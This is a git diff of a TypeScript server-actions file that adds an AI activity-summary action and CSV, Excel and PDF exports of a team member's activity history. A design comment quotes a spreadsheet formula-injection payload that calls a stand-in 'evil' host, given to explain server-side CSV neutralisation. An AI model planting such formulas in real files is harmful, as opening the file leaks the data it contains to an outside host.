@@ -2,6 +2,8 @@
 
 import { requireRole, requireUser } from '@/lib/auth/current-user';
 import {
+  activityEvents,
+  personBrief,
   completedInWindow,
   dailyTaskForms,
   taskLedgerDetail,
@@ -18,7 +20,19 @@ import {
   type FormRow,
   type TaskFormSheet,
 } from '@/lib/pdf/task-assignment-form';
-import { writeNarrative, type Narrative } from '@/lib/ai/narrative';
+import {
+  writeActivitySummary,
+  writeNarrative,
+  type ActivitySummary,
+  type Narrative,
+} from '@/lib/ai/narrative';
+import { dayWord, phraseOf, KIND_LABEL, eventKind } from '@/lib/view/activity';
+import { toCsv } from '@/lib/domain/csv';
+import {
+  composeActivityHistory,
+  type ActivityPdfDay,
+  type ActivityPdfRow,
+} from '@/lib/pdf/activity-history-pdf';
 import {
   dayAccount,
   deadlineMoves,
@@ -551,4 +565,382 @@ export async function taskLedgerDetailAction(taskId: string): Promise<LedgerDeta
     console.error('[performance] ledger detail failed', error);
     return { ok: false, error: 'That task could not be read.' };
   }
+}
+
+/* ============================================================================
+ * SUMMARISE THIS ACTIVITY \u2014 owner, 2026-09-24
+ * ----------------------------------------------------------------------------
+ * The button on the Activity history panel. The browser sends the ids of the
+ * events currently in view; every word the model reads is fetched back out of
+ * the database here (see `activityEvents`), phrased by the same pure module the
+ * rows themselves use, and handed over already decided.
+ * ========================================================================= */
+
+export interface ActivitySummaryPayload {
+  readonly ok: boolean;
+  readonly error?: string;
+  readonly summary?: ActivitySummary;
+  /** The exact log the model was given, so a reader can check its working. */
+  readonly log?: string;
+}
+
+export async function activitySummaryAction(
+  personId: string,
+  eventIds: readonly string[],
+): Promise<ActivitySummaryPayload> {
+  const { user, ownOnly } = await requireRoleAndUser();
+  /* \u26a0\ufe0f A MEMBER SUMMARISES THEMSELVES, whichever id arrived. */
+  const who = ownOnly ? user.id : personId;
+
+  /* \u26a0\ufe0f CAPPED BEFORE THE ROUND TRIP. 400 events is the read's own ceiling;
+     the newest 120 is as much as the model can usefully describe, and it keeps
+     a pasted list of ids from becoming an expensive request. */
+  const ids = [...new Set(eventIds)].filter((id) => UUID_RE.test(id)).slice(0, 120);
+  if (ids.length === 0) {
+    return { ok: false, error: 'There are no events in view to summarise.' };
+  }
+
+  try {
+    const events = await activityEvents(user.id, who, ids);
+    if (events.length === 0) {
+      return { ok: false, error: 'Those events could not be read.' };
+    }
+    const log = activityFactSheet(events);
+    const summary = await writeActivitySummary(log);
+    return { ok: true, summary, log };
+  } catch (error) {
+    console.error('[performance] activity summary failed', error);
+    return {
+      ok: false,
+      error:
+        error instanceof Error && error.message.includes('CHATGPT_API_KEY')
+          ? 'The AI key is not configured, so the written summary is unavailable. Every event below is still read from the database.'
+          : 'The written summary could not be produced. Every event below is still read from the database.',
+    };
+  }
+}
+
+const UUID_RE = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
+
+/**
+ * The events as lines the model may only rearrange.
+ *
+ * \u26a0\ufe0f IT STATES WHAT IS MISSING. A move with no recorded reason says so on
+ * its own line, because a model given silence will fill it \u2014 and a plausible
+ * invented reason on a page about a named colleague is the worst thing this
+ * screen could print.
+ */
+function activityFactSheet(events: readonly Awaited<ReturnType<typeof activityEvents>>[number][]): string {
+  const when = (iso: string) =>
+    new Date(iso).toLocaleString('en-GB', {
+      timeZone: 'Asia/Karachi',
+      day: 'numeric',
+      month: 'short',
+      hour: '2-digit',
+      minute: '2-digit',
+      hour12: false,
+    });
+
+  const lines = events.map((e) => {
+    const p = phraseOf(e);
+    const task = e.title ?? 'a task';
+    const diff = p.changes
+      .map((c) => `${c.field}: ${c.from ?? 'not set'} to ${c.to ?? 'not set'}`)
+      .join('; ');
+    return [
+      `${when(e.at)} PKT \u2014 ${e.actorName ?? 'Somebody'} ${p.verb} "${task}"`,
+      e.projectName ? ` in ${e.projectName}` : '',
+      diff ? ` (${diff})` : '',
+      p.note ? ` [${p.note}]` : '',
+      e.reason ? ` Reason given: "${e.reason}".` : '',
+    ].join('');
+  });
+
+  const withReason = events.filter((e) => e.reason).length;
+
+  return [
+    `EVENTS: ${events.length}, oldest first.`,
+    '',
+    ...lines,
+    '',
+    'NOT RECORDED:',
+    `- A reason was recorded on ${withReason} of these ${events.length} events. The product asks for a reason when work is blocked or cancelled and at no other time, so the rest were never asked. Do not supply one.`,
+    '- Hours worked are not recorded anywhere in this system, so nothing here says how long anything took.',
+    '- Rework is not recorded as such; a task returning to an earlier status is the only trace of it.',
+  ].join('\n');
+}
+
+/* ============================================================================
+ * EXPORTING THE ACTIVITY HISTORY \u2014 owner, 2026-09-24
+ * ----------------------------------------------------------------------------
+ * *"Export also show a drop-up option of export in CSV and Excel and PDF ...
+ * PDF in a proper template."*
+ *
+ * \u26a0\ufe0f ALL THREE ARE BUILT HERE, NOT IN THE BROWSER. The first version wrote
+ * the CSV client-side, which is fast and wrong: a task titled
+ * `=HYPERLINK("http://evil/"&A1,"brief")` is a live formula the moment the file
+ * opens, and task titles are typed by people. `lib/domain/csv.ts` already
+ * neutralises that and is not reimplemented \u2014 two copies of a security control
+ * is one copy that gets forgotten. Building all three in one place also means
+ * the spreadsheet and the sheet cannot drift from each other.
+ *
+ * \u26a0\ufe0f AND THE ROWS ARE READ BACK FROM THE DATABASE, not posted up from the
+ * page. The browser sends the ids of what it had in view; every word in the
+ * file is fetched under the caller's own RLS.
+ * ========================================================================= */
+
+export type ActivityFormat = 'csv' | 'xlsx' | 'pdf';
+
+export interface ActivityExport {
+  readonly ok: boolean;
+  readonly error?: string;
+  readonly base64?: string;
+  readonly fileName?: string;
+  readonly mime?: string;
+  readonly events?: number;
+}
+
+const ACTIVITY_MIME: Record<ActivityFormat, string> = {
+  csv: 'text/csv;charset=utf-8',
+  xlsx: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
+  pdf: 'application/pdf',
+};
+
+export async function exportActivityAction(request: {
+  personId: string;
+  eventIds: readonly string[];
+  format: ActivityFormat;
+  /** What the screen was narrowed to, already worded, for the sheet's header. */
+  filters?: readonly string[];
+  periodLabel?: string;
+  totalInPeriod?: number;
+}): Promise<ActivityExport> {
+  const { user, ownOnly } = await requireRoleAndUser();
+  const who = ownOnly ? user.id : request.personId;
+
+  const ids = [...new Set(request.eventIds)].filter((id) => UUID_RE.test(id)).slice(0, 400);
+  if (ids.length === 0) return { ok: false, error: 'There are no events in view to export.' };
+
+  try {
+    const [events, person] = await Promise.all([
+      activityEvents(user.id, who, ids),
+      personBrief(user.id, who),
+    ]);
+    if (events.length === 0) return { ok: false, error: 'Those events could not be read.' };
+
+    /* Newest first, the way the screen reads. `activityEvents` returns oldest
+       first because that is the order the model is given. */
+    const rows = [...events]
+      .sort((a, b) => b.at.localeCompare(a.at))
+      .map((e) => activityRow(e));
+
+    const slug = (person?.name ?? 'person').toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '');
+    const stem = `activity-${slug}-${isoDateIn()}`;
+
+    if (request.format === 'csv') {
+      const csv = toCsv(
+        ACTIVITY_HEADERS,
+        rows.map((r) => [r.date, r.time, r.actor, r.event, r.task, r.reference, r.project, r.change, r.reason, r.source]),
+      );
+      return {
+        ok: true,
+        base64: Buffer.from(csv, 'utf8').toString('base64'),
+        fileName: `${stem}.csv`,
+        mime: ACTIVITY_MIME.csv,
+        events: rows.length,
+      };
+    }
+
+    if (request.format === 'xlsx') {
+      const bytes = await activityToXlsx(person?.name ?? 'Team member', request, rows);
+      return {
+        ok: true,
+        base64: bytes.toString('base64'),
+        fileName: `${stem}.xlsx`,
+        mime: ACTIVITY_MIME.xlsx,
+        events: rows.length,
+      };
+    }
+
+    const company = await companyLetterhead(user.id);
+    /* Grouped the way the screen groups, in the order the rows arrived. */
+    const days: ActivityPdfDay[] = [];
+    for (const r of rows) {
+      const last = days[days.length - 1];
+      if (last && last.label === r.date) (last.rows as ActivityPdfRow[]).push(r.pdf);
+      else days.push({ label: r.date, rows: [r.pdf] });
+    }
+
+    const bytes = await composeActivityHistory({
+      company,
+      personName: person?.name ?? 'Team member',
+      personRole: person?.roleTitle ?? '',
+      periodLabel: request.periodLabel ?? '',
+      filters: request.filters ?? [],
+      totalInPeriod: request.totalInPeriod ?? rows.length,
+      days,
+      /* ⚠️ dayWord, NOT month: 'short'. en-GB writes "24 Sept 2026" while every
+         other date on this page and in this file writes "24 Sep 2026". */
+      generatedAt: [
+        dayWord(new Date(nowMs()).toLocaleDateString('en-CA', { timeZone: 'Asia/Karachi' })),
+        new Date(nowMs()).toLocaleTimeString('en-GB', {
+          timeZone: 'Asia/Karachi',
+          hour: '2-digit',
+          minute: '2-digit',
+          hour12: false,
+        }),
+      ].join(', '),
+      generatedFor: user.fullName,
+    });
+
+    return {
+      ok: true,
+      base64: Buffer.from(bytes).toString('base64'),
+      fileName: `${stem}.pdf`,
+      mime: ACTIVITY_MIME.pdf,
+      events: rows.length,
+    };
+  } catch (error) {
+    console.error('[performance] activity export failed', error);
+    return { ok: false, error: 'That export could not be made.' };
+  }
+}
+
+const ACTIVITY_HEADERS = [
+  'Date',
+  'Time (PKT)',
+  'Who',
+  'Event',
+  'Task',
+  'Reference',
+  'Project',
+  'What changed',
+  'Reason given',
+  'Where the task came from',
+] as const;
+
+const SOURCE_WORD: Record<string, string> = {
+  self: 'Self-created',
+  coordinator: 'Assigned by a team coordinator',
+  admin: 'Assigned by an admin',
+  teammate: 'Seeded data',
+  unknown: 'Not recorded',
+};
+
+/** One event, worded once, for all three formats. */
+function activityRow(e: Awaited<ReturnType<typeof activityEvents>>[number]) {
+  const p = phraseOf(e);
+  const at = new Date(e.at);
+  const date =
+    dayWord(at.toLocaleDateString('en-CA', { timeZone: 'Asia/Karachi' })) ?? '';
+  const time = at.toLocaleTimeString('en-GB', {
+    timeZone: 'Asia/Karachi',
+    hour: '2-digit',
+    minute: '2-digit',
+    hour12: false,
+  });
+  const change =
+    p.changes.length > 0
+      ? p.changes.map((c) => `${c.field}: ${c.from ?? 'not set'} -> ${c.to ?? 'not set'}`).join('; ')
+      : (p.note ?? '');
+  const event = KIND_LABEL[eventKind(e.action)];
+  const task = e.title ?? '';
+  const project = e.projectName ?? '';
+  const actor = e.actorName ?? 'Not recorded';
+  const reason = e.reason ?? '';
+
+  return {
+    date,
+    time,
+    actor,
+    event,
+    task,
+    reference: e.reference ?? '',
+    project,
+    change,
+    reason,
+    source: SOURCE_WORD[e.sourceKind] ?? 'Not recorded',
+    pdf: { time, actor, event, task, project, change, reason } satisfies ActivityPdfRow,
+  };
+}
+
+/**
+ * The spreadsheet.
+ *
+ * \u26a0\ufe0f TWO SHEETS, for the same reason the Reports export has two: a header
+ * block sitting above the table breaks sorting, filtering and every formula
+ * that assumes row 1 is the header. The context travels in "About".
+ */
+async function activityToXlsx(
+  name: string,
+  request: { periodLabel?: string; filters?: readonly string[]; totalInPeriod?: number },
+  rows: ReturnType<typeof activityRow>[],
+): Promise<Buffer> {
+  const writeXlsxFile = (await import('write-excel-file/node')).default;
+  type Cell = import('write-excel-file/node').CellObject;
+
+  const header: Cell[] = ACTIVITY_HEADERS.map((label) => ({
+    value: label,
+    fontWeight: 'bold',
+    backgroundColor: '#0F3D3E',
+    color: '#FFFFFF',
+    align: 'left',
+  }));
+
+  const body: Cell[][] = rows.map((r) =>
+    [r.date, r.time, r.actor, r.event, r.task, r.reference, r.project, r.change, r.reason, r.source].map(
+      (value): Cell => (value === '' ? {} : { value, type: String }),
+    ),
+  );
+
+  const about: Cell[][] = [
+    [{ value: `Activity history \u2014 ${name}`, fontWeight: 'bold' }],
+    [{ value: request.periodLabel ?? '' }],
+    [],
+    [
+      { value: 'Events in this file', fontWeight: 'bold' },
+      { value: rows.length, type: Number },
+    ],
+    [
+      { value: 'Events in the period', fontWeight: 'bold' },
+      { value: request.totalInPeriod ?? rows.length, type: Number },
+    ],
+    [],
+    [{ value: 'Filters applied', fontWeight: 'bold' }],
+    ...(request.filters && request.filters.length > 0
+      ? request.filters.map((f): Cell[] => [{ value: f }])
+      : [[{ value: 'None \u2014 this is the whole period.' }] as Cell[]]),
+    [],
+    [{ value: 'How to read this', fontWeight: 'bold' }],
+    [
+      {
+        value:
+          'A reason is recorded only where the product asks for one, which is when work is blocked or cancelled. An empty Reason means nobody was asked, not that nobody had one.',
+        wrap: true,
+      },
+    ],
+    [
+      {
+        value:
+          'Hours worked are not recorded anywhere in this system, so nothing here says how long a piece of work took.',
+        wrap: true,
+      },
+    ],
+  ];
+
+  const { toBuffer } = await writeXlsxFile([
+    {
+      data: [header, ...body],
+      sheet: 'Activity',
+      columns: [
+        { width: 14 }, { width: 10 }, { width: 20 }, { width: 16 }, { width: 38 },
+        { width: 12 }, { width: 22 }, { width: 34 }, { width: 26 }, { width: 26 },
+      ],
+      stickyRowsCount: 1,
+      orientation: 'landscape',
+    },
+    { data: about, sheet: 'About', columns: [{ width: 30 }, { width: 60 }], showGridLines: false },
+  ]);
+
+  return toBuffer();
 }
